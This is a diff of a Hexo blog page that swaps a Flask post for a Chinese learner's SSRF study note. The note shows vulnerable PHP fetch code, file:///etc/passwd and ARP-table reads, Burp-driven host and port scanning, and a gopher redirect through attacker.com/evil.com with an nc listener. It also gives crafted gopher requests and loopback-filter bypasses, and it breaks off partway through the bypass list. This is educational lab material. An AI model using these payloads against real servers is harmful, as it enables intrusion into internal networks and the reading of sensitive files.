@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2025/03/16/flask/"/>
+  <link rel="canonical" href="http://example.com/2025/03/17/ssrf/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,19 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Flask - Hexo</title>
+  <title>SSRF - Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="Flask">
-<meta property="og:url" content="http://example.com/2025/03/16/Flask/index.html">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://example.com/2025/03/17/SSRF/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Flask学习笔记前言本来在学习计划里面flask应该是要放在和python和requests库一起去学的，但是我优先去学其他漏洞去了，现在回来补以下，后面的漏洞会用到 1.Flask简介Flask是一个轻量级的基于Python的web框架。 简介很短，我看了一下后感觉和php有点像，都是结合html去构建web页面，甚至有些功能都和php相似 2.Hello World在计算机领域，正可谓Hel">
+<meta property="og:description" content="SSRF漏洞笔记前言虽然现在可以在buu上一直做题了，但还是需要学一些新的东西，还有就是要跟上其他人的进度，我可不想被优化 1.SSRF漏洞简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2025-03-16T06:41:43.000Z">
-<meta property="article:modified_time" content="2025-03-16T09:24:07.779Z">
+<meta property="article:published_time" content="2025-03-17T12:54:22.000Z">
+<meta property="article:modified_time" content="2025-03-21T13:17:07.921Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1742129408785),
+    lastupdate: new Date(1742716915715),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2517,7 +2517,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/16/Flask/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/17/SSRF/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2538,7 +2538,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        Flask
+        SSRF
       </h1>
       <div class='new-meta-box'>
         
@@ -2559,10 +2559,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-03-16T14:41:43+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-03-17T20:54:22+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Mar 16, 2025</p>
+    <p>发布于：Mar 17, 2025</p>
   </a>
 </div>
 
@@ -2585,192 +2585,210 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="Flask学习笔记"><a href="#Flask学习笔记" class="headerlink" title="Flask学习笔记"></a>Flask学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来在学习计划里面flask应该是要放在和python和requests库一起去学的，但是我优先去学其他漏洞去了，现在回来补以下，后面的漏洞会用到</p>
-<h2 id="1-Flask简介"><a href="#1-Flask简介" class="headerlink" title="1.Flask简介"></a>1.Flask简介</h2><p>Flask是一个轻量级的基于Python的web框架。</p>
-<p>简介很短，我看了一下后感觉和php有点像，都是结合html去构建web页面，甚至有些功能都和php相似</p>
-<h2 id="2-Hello-World"><a href="#2-Hello-World" class="headerlink" title="2.Hello World"></a>2.Hello World</h2><p>在计算机领域，正可谓Hello World生万物，一切都起源于神秘的Hello World</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+    <h1 id="SSRF漏洞笔记"><a href="#SSRF漏洞笔记" class="headerlink" title="SSRF漏洞笔记"></a>SSRF漏洞笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然现在可以在buu上一直做题了，但还是需要学一些新的东西，还有就是要跟上其他人的进度，我可不想被优化</p>
+<h2 id="1-SSRF漏洞简介"><a href="#1-SSRF漏洞简介" class="headerlink" title="1.SSRF漏洞简介"></a>1.SSRF漏洞简介</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<p>比如我们可以通过百度识图等可以访问的服务器，发送给它一个恶意url，它将这个恶意url发给其内网的某台服务器，以达成攻击目的</p>
+<p><strong>漏洞形成原理</strong></p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
+<img src="/2025/03/17/SSRF/966c60217969cfa4cf88e7c25bc06ea9.png" class="lazyload" data-srcset="/2025/03/17/SSRF/966c60217969cfa4cf88e7c25bc06ea9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="在这里插入图片描述">
 
-<p>运行结果不重要反正都是Hello World。程序运行后会给我们一个网址<code>127.0.0.1:5000</code>访问即可看到结果</p>
-<p>代码解析：</p>
+<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<h2 id="2-产生SSRF漏洞的函数"><a href="#2-产生SSRF漏洞的函数" class="headerlink" title="2.产生SSRF漏洞的函数"></a>2.产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。</p>
+<h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents:"></a>1.file_get_contents:</h3><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-sockopen"><a href="#2-sockopen" class="headerlink" title="2.sockopen():"></a>2.sockopen():</h3><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-curl-exec"><a href="#3-curl-exec" class="headerlink" title="3.curl_exec():"></a>3.curl_exec():</h3><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注意事项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-使用到的url协议"><a href="#3-使用到的url协议" class="headerlink" title="3.使用到的url协议"></a>3.使用到的url协议</h2><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-file-协议-寻找主机"><a href="#1-file-协议-寻找主机" class="headerlink" title="1.file:&#x2F;&#x2F;协议 寻找主机"></a>1.file:&#x2F;&#x2F;协议 寻找主机</h3><p>我们之前学php时接触到了file伪协议，顾名思义那是个伪造的，于是真的file协议来了。区别在于php伪协议前面有php:&#x2F;&#x2F;file。而file协议则是，file:&#x2F;&#x2F;</p>
+<p><strong>file协议的作用</strong></p>
+<p>File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。</p>
+<p><strong>格式</strong></p>
+<p>file:&#x2F;&#x2F;机器的IP地址&#x2F;目录&#x2F;文件，例如要打开D盘images文件夹中的111.png文件，那么可以在资源管理器或IE地址栏中键入file:&#x2F;&#x2F;D:&#x2F;images&#x2F;111.png 然后回车。</p>
+<p>注：（1）对于本地机器，机器的IP地址可变成127.0.0.1或localhost或什么也不写。</p>
+<p>（2）“&#x2F;”符号一个都不能少。</p>
+<p>相应的我们也可以通过file协议访问服务器端的各种文件</p>
+<p>我抄了一些常见的file协议(用于linux系统)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取文件passwd</span></span><br><span class="line"><span class="attr">file</span>:<span class="comment">///etc/passwd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示当前操作系统网卡的ip</span></span><br><span class="line"><span class="attr">file</span>:<span class="comment">///etc/hosts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示arp缓存表(寻找内网其他主机)</span></span><br><span class="line"><span class="attr">file</span>:<span class="comment">///proc/net/arp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示当前网段路由信息</span></span><br><span class="line"><span class="attr">file</span>:<span class="comment">///proc/net/fib_trie</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们去别人靶场试一下</p>
+<img src="/2025/03/17/SSRF/image-20250317215232654.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250317215232654.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250317215232654">
+
+<p>我们访问到这样的结果，显示了两个公网ip，这表示这台服务器有两张网卡</p>
+<p>于是我们可以去通过SSRF漏洞去访问内网的其他主机，我们在访问的时候不需要在意使用的是什么协议，或者是否能访问，只要这台服务器在开启就会回复一个响应</p>
+<img src="/2025/03/17/SSRF/image-20250317221332923.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250317221332923.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250317221332923">
+
+<p>我们访问arp缓存表，虽然不知道为什么会有这些东西(估计是储存了这个网络的访问记录)，但只需要知道HW assress有回显而不全是0的服务器就存在</p>
+<p>我们可以通过SSRF漏洞用bp的攻击模块探测出其他存活服务器</p>
+<img src="/2025/03/17/SSRF/image-20250317222016397.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250317222016397.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250317222016397">
+
+<p>我们对主机号进行攻击，前面的表示网络地址和现实地址不能改动</p>
+<img src="/2025/03/17/SSRF/image-20250317222412248.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250317222412248.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250317222412248">
+
+<p>进行攻击，拿到的长度长的就应该是存活主机</p>
+<h3 id="2-dict-协议-寻找端口"><a href="#2-dict-协议-寻找端口" class="headerlink" title="2.dict:&#x2F;&#x2F;协议 寻找端口"></a>2.dict:&#x2F;&#x2F;协议 寻找端口</h3><img src="/2025/03/17/SSRF/image-20250318152918249.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318152918249.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318152918249">
+
+<p>我们寻找到了存活主机后就需要去寻找开启的端口号，这里我们可以使用dict协议去寻找开放端口，ftp协议也可以但效率低</p>
+<img src="/2025/03/17/SSRF/image-20250318153823029.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318153823029.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318153823029">
+
+<p>我们使用bp抓包后发送到攻击器，由于有两个地方需要进行攻击，我们需要把狙击手改为集束炸弹，原理应该就是两个攻击进行排列组合，攻击所有选项</p>
+<img src="/2025/03/17/SSRF/image-20250318154337584.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318154337584.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318154337584">
+
+<p>我们扫描后可以通过看返回数据的长短判断哪些端口是开启的</p>
+<img src="/2025/03/17/SSRF/image-20250318154515748.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318154515748.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318154515748">
+
+<img src="/2025/03/17/SSRF/image-20250318154839185.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318154839185.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318154839185">
+
+
+
+<h3 id="3-http-协议-查看页面信息"><a href="#3-http-协议-查看页面信息" class="headerlink" title="3.http:&#x2F;&#x2F;协议 查看页面信息"></a>3.http:&#x2F;&#x2F;协议 查看页面信息</h3><img src="/2025/03/17/SSRF/image-20250318161750905.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318161750905.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318161750905">
+
+<p>我们扫描页面之前都是用dirsearch扫描的，这次扫描也无非就是用字典去扫面ip或域名后面的文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//ip/index.php</span></span><br><span class="line">我们对index.<span class="property">php</span>使用各种字典进行攻击即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-gopher-发送POST和GET请求"><a href="#4-gopher-发送POST和GET请求" class="headerlink" title="4.gopher:&#x2F;&#x2F; 发送POST和GET请求"></a>4.gopher:&#x2F;&#x2F; 发送POST和GET请求</h3><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure>
+
+<p>其实其他协议的作用基本上都是传递文件内容。但gopher:&#x2F;&#x2F;协议肯定有独特的地方，那就是可以进行POST和GET请求。</p>
+<p>我们之前的请求都是通过url传递的，但是那样只能把请求发给SSRF漏洞主机，无法攻击到内网目标服务器，这个时候就需要gopher协议去发送这个请求</p>
+<img src="/2025/03/17/SSRF/image-20250318172213083.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318172213083.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318172213083">
+
+
+
+<p>我们在进行请求的时候，需要包含一些头部信息才能进行提交，GET和POST还不同</p>
+<p><strong>GET</strong></p>
+<img src="/2025/03/17/SSRF/image-20250318172532839.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318172532839.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318172532839">
+
+<p>也就是我们需要在提交的url中带上上面的信息</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gopher</span>:<span class="comment">//ip:端口/_保留的头部信息(需要进行一次url编码，防止最后的回车丢失) 需要注意的是gopher不会读取第一个字符，所以需要加一个字符分开</span></span><br></pre></td></tr></table></figure>
+
+<p>这是我们普通在输入框中输入url的形式，我们也可以抓包然后改包就行了，但是我们需要将头部信息进行两次url编码，有两次编码(分别是POST请求发送时编码，和发送到目标服务器作为url也需要一次编码)</p>
+<p>有一些细节还是需要注意一下的，这个东西真的很麻烦</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_GET /name.php?name=benben HTTP/1.1</span><br><span class="line">Host:172.250.250.4</span><br><span class="line"></span><br><span class="line">GET后面必须加空格，编码是必须把Host后面的回车加上</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>POST</strong></p>
+<img src="/2025/03/17/SSRF/image-20250318220844759.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318220844759.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318220844759">
+
+<p>比GET需要的头部信息多了两个模块，content-type和content-length，以及传参方式改为POST，Content-Length决定了读取的字符数，所以需要和传递字符串一致。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_POST /name.php HTTP/1.1</span><br><span class="line">Host:172.250.250.4</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:12</span><br><span class="line"></span><br><span class="line">name=regulus</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/03/17/SSRF/image-20250318223639825.png" class="lazyload" data-srcset="/2025/03/17/SSRF/image-20250318223639825.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250318223639825">
+
+
+
+<h2 id="4-SSRF绕过"><a href="#4-SSRF绕过" class="headerlink" title="4.SSRF绕过"></a>4.SSRF绕过</h2><h3 id="1-环回地址绕过"><a href="#1-环回地址绕过" class="headerlink" title="1.环回地址绕过"></a>1.环回地址绕过</h3><p>ip地址比如127.0.0.1中数字是由10进制表示的，在计算机中是以二进制识别的，但实际上ip可以有多种表示方法</p>
+<p>当对方网站过滤掉了我们的127.0.0.1时，我们可以采用进制转换的方法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1</span><br><span class="line"> </span><br><span class="line">二进制 没有点</span><br><span class="line">http://01111111.00000000.00000000.00000001</span><br><span class="line"></span><br><span class="line">十六进制和八进制前面需要加上标识符</span><br><span class="line">八进制</span><br><span 